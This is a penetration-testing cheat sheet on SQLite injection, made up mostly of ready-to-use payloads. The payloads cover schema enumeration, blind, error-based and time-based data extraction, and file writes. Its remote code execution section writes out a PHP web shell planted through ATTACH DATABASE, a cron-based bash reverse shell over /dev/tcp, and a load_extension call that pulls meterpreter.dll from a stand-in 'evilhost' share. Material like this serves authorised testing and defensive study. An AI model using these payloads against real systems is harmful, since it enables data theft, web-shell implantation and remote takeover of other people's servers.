# SQLite Injection

> SQLite Injection  is a type of security vulnerability that occurs when an attacker can insert or "inject" malicious SQL code into SQL queries executed by an SQLite database. This vulnerability arises when user inputs are integrated into SQL statements without proper sanitization or parameterization, allowing attackers to manipulate the query logic. Such injections can lead to unauthorized data access, data manipulation, and other severe security issues.

## Summary

* [SQLite Comments](#sqlite-comments)
* [SQLite Enumeration](#sqlite-enumeration)
* [SQLite String](#sqlite-string)
    * [SQLite String Methodology](#sqlite-string-methodology)
* [SQLite Blind](#sqlite-blind)
    * [SQLite Blind Methodology](#sqlite-blind-methodology)
    * [SQLite Blind With Substring Equivalent](#sqlite-blind-with-substring-equivalent)
* [SQlite Error Based](#sqlite-error-based)
* [SQlite Time Based](#sqlite-time-based)
* [SQlite Remote Code Execution](#sqlite-remote-code-execution)
    * [Attach Database](#attach-database)
    * [Load_extension](#load_extension)
* [SQLite File Manipulation](#sqlite-file-manipulation)
    * [SQLite Read File](#sqlite-read-file)
    * [SQLite Write File](#sqlite-write-file)
* [References](#references)

## SQLite Comments

| Description         | Comment |
| ------------------- | ------- |
| Single-Line Comment | `--`    |
| Multi-Line Comment  | `/**/`  |

## SQLite Enumeration

| Description   | SQL Query |
| ------------- | ----------------------------------------- |
| DBMS version  | `select sqlite_version();`                |

## SQLite String

### SQLite String Methodology

| Description             | SQL Query                                 |
| ----------------------- | ----------------------------------------- |
| Extract Database Structure                           | `SELECT sql FROM sqlite_schema` |
| Extract Database Structure (sqlite_version > 3.33.0) | `SELECT sql FROM sqlite_master` |
| Extract Table Name  | `SELECT tbl_name FROM sqlite_master WHERE type='table'` |
| Extract Table Name  | `SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'` |
| Extract Column Name | `SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'` |
| Extract Column Name | `SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');` |
| Extract Column Name | `SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'` |
| Extract Column Name | `SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')` |

## SQLite Blind

### SQLite Blind Methodology

| Description             | SQL Query                                 |
| ----------------------- | ----------------------------------------- |
| Count Number Of Tables  | `AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table` |
| Enumerating Table Name  | `AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number` |
| Extract Info            | `AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('some_char')` |
| Extract Info (order by) | `CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) = HEX('some_char') THEN <order_element_1> ELSE <order_element_2> END` |

### SQLite Blind With Substring Equivalent

| Function    | Example                                   |
| ----------- | ----------------------------------------- |
| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`  |
| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     |

## SQlite Error Based

```sql
AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
```

## SQlite Time Based

```sql
AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

## SQLite Remote Code Execution

### Attach Database

This snippet shows how an attacker could abuse SQLite's `ATTACH DATABASE` feature to plant a web-shell on a server:

```sql
ATTACH DATABASE '/var/www/shell.php' AS shell;
CREATE TABLE shell.pwn (dataz text);
INSERT INTO shell.pwn (dataz) VALUES ('<?php system($_GET["cmd"]); ?>');--
```

First, it tells SQLite to "treat" a PHP file as a writable SQLite database. Then it creates a table inside that file (which is actually the future web-shell). Finally it writes malicious PHP code into the file.

**Note:** Using `ATTACH DATABASE` to create a file comes with a drawback: SQLite will prepend its magic header bytes (`5351 4c69 7465 2066 6f72 6d61 7420 3300`, i.e., *"SQLite format 3"*). These bytes will corrupt most server-side scripts, but PHP is unusually tolerant: as long as a `<?php` tag appears anywhere in the file, the interpreter ignores any preceding garbage and executes the embedded code.

```ps1
file shell.php  
shell.php: SQLite 3.x database, last written using SQLite version 3051000, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2
```

If uploading a PHP web shell isn’t possible but the service runs with root privileges, an attacker can use the same technique to create a cron job that triggers a reverse shell:

```sql
ATTACH DATABASE '/etc/cron.d/pwn.task' AS cron;
CREATE TABLE cron.tab (dataz text);
INSERT INTO cron.tab (dataz) VALUES (char(10) || '* * * * * root bash -i >& /dev/tcp/127.0.0.1/4242 0>&1' || char(10));--
```

This writes a new cron entry that runs every minute and connects back to the attacker.

### Load_extension

:warning: SQLite's ability to load external shared libraries (extensions) is disabled by default in most environments. When enabled, SQLite can load a compiled module using the `load_extension()` SQL function:

```sql
SELECT load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
```

In the sqlite3 command-line shell you can display runtime configuration with:

```sql
sqlite> .dbconfig
    load_extension on
```

If you see `load_extension on` (or off), that indicates whether the shell's runtime currently permits loading shared-library extensions.

A SQLite extension is simply a native shared library,typically a `.so` file on Linux or a `.dll` file on Windows, that exposes a special initialization function. When the extension is loaded, SQLite calls this function to register any new SQL functions, virtual tables, or other features provided by the module.

To compile a loadable extension on Linux, you can use:

```ps1
gcc -g -fPIC -shared demo.c -o demo.so
```

## SQLite File Manipulation

### SQLite Read File

SQLite does not support file I/O operations by default.

### SQLite Write File

```sql
SELECT writefile('/path/to/file', column_name) FROM table_name
```

## References

* [Injecting SQLite database based application - Manish Kishan Tanwar - February 14, 2017](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)
* [SQLite Error Based Injection for Enumeration - Rio Asmara Suryadi - February 6, 2021](https://rioasmara.com/2021/02/06/sqlite-error-based-injection-for-enumeration/)
* [SQLite3 Injection Cheat sheet - Nickosaurus Hax - May 31, 2012](https://web.archive.org/web/20131208191957/https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
